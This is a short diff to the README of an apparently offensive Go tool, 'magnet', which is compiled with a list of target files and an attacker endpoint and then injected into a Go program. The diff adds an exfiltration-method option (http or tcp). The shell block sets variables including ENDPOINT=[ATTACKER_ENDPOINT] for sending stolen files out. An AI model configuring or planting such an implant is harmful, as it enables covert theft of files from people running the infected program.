@@ -22,16 +22,16 @@ You have 2 possibilities:
 ## Usage
 
 All the work is made **At compilation time**, you need to specify:
-* ***The remote endpoint***, where juicy files are uploaded
-* ***The Juicy files***, list of files you want to grab
-* ***The target os***, to fit the target (between: `windows`, `darwin`, `linux`)
-
+* The ***remote endpoint***, where juicy files are uploaded
+* The ***Juicy files***, list of files you want to grab
+* The ***target os***, to fit the target (between: `windows`, `darwin`, `linux`)
+* The ***method*** uses for exfiltration (`http`, `tcp`)
 ```shell
 export KEY=[YOUR_KEY]
 export FILES=[FILENAME]
 export ENDPOINT=[ATTACKER_ENDPOINT]
 export TARGET_OS=[TARGET_OS]
-export METHOD=[http/tcp]
+export METHOD=[EXFILTRATION_METHOD]
 ```
 
 ### 🥷 Inject `magnet` in your Go program
